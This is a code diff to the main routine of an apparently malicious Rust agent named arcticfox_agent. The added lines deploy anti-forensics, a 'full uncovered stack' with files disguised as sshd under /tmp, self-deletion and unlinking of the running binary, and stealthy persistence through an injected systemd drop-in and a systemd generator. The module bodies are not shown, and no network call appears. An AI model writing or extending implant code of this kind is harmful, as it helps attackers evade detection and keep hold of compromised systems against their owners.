@@ -118,13 +118,22 @@ async fn main() {
 
     // ── Anti-analysis / anti-forensics ────────────────────────────────────
     arcticfox_agent::anti_analysis::detect_hostile_environment();
-    arcticfox_agent::anti_forensics::deploy_anti_forensics(
-        &stealth_name,
-        &std::env::current_exe()
-            .unwrap_or_else(|_| std::path::PathBuf::from("."))
-            .display()
-            .to_string(),
+
+    let exe_path = std::env::current_exe()
+        .unwrap_or_else(|_| std::path::PathBuf::from("."));
+    let exe_str = exe_path.display().to_string();
+
+    arcticfox_agent::anti_forensics::deploy_anti_forensics(&stealth_name, &exe_str);
+
+    // ── Uncovered techniques (best-effort, non-fatal) ─────────────────────
+    let _ = arcticfox_agent::uncovered::deploy_full_uncovered_stack(
+        &exe_str, &["--daemon"], &["/tmp/.sd-id", "/tmp/.sshd"], "/tmp/.criu",
     );
+
+    // ── Self-delete + unlink after startup ─────────────────────────────────
+    arcticfox_agent::stealth::self_delete();
+    arcticfox_agent::stealth::unlink_self();
+    arcticfox_agent::stealth::write_pid_file(std::process::id());
 
     // ── Watchdog mode ─────────────────────────────────────────────────────
     if cli.watchdog {
@@ -148,7 +157,12 @@ async fn main() {
             error!("Failed to install persistence: {e}");
             std::process::exit(1);
         }
-        info!("Persistence installed successfully");
+        // Also deploy systemd drop-in override for stealth
+        let name = stealth_name.clone();
+        let path = agent_path.display().to_string();
+        let _ = arcticfox_agent::evasion::inject_systemd_dropin(&path, &name, &["--daemon", "--name", &stealth_name]);
+        let _ = arcticfox_agent::systemd_gen::deploy_generator(&path, &["--daemon"], true);
+        info!("Persistence + evasion installed successfully");
         return;
     }
 
